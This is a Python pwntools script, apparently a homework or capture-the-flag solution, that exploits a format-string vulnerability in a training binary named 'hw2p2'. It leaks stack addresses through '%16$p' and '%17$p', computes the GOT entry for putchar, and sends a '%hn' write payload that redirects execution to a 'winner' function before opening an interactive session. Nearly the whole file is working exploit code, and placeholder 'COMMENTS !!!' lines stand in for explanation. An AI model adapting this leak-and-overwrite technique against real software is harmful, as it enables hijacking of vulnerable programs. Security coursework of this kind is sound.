#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

def start(argv = [], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript = gdbscript, aslr = True, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath], aslr = True, *a, **kw)


binPath = "./hw2p2"
isRemote = pwn.args.REMOTE

# break at printf
gdbscript = '''
init-pwndbg
break *mainProcessing+86 
continue
'''.format(**locals())


pwn.context.log_level = "critical"
io = start()
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
io.sendlineafter(b"Get user input:\n", b"%16$p")

winner_add = io.recvline()
winner = int(winner_add, 16) # COMMENTS !!!

io.sendlineafter(b"Get user input:\n", b"%17$p")
got = int(io.recvline(), 16)
putchar = got + 0x1c

putchar = putchar
putcharplus2 = putchar + 0x2 # COMMENTS !!!

'''
# COMMENTS !!!
# COMMENTS !!!
# COMMENTS !!!
# COMMENTS !!!
# COMMENTS !!!
'''

highorder = winner_add[0:6]
loworder = (b"0x" + winner_add[6:]).strip()

highorder = int(highorder, 16)
loworder = int(loworder, 16)

newhigh = highorder - loworder + 0x10000
newlow = loworder - 8

'''
# COMMENTS !!!
# COMMENTS !!!
# COMMENTS !!!
# COMMENTS !!!
'''

payload2 = pwn.p32(putchar) + pwn.p32(putcharplus2) + b"%" + str(newlow).encode('utf-8') + b"x%1$hn" + b"%" + str(newhigh).encode('utf-8') + b"x%2$hn"

io.sendlineafter(b"Get user input:\n", payload2)
io.interactive()
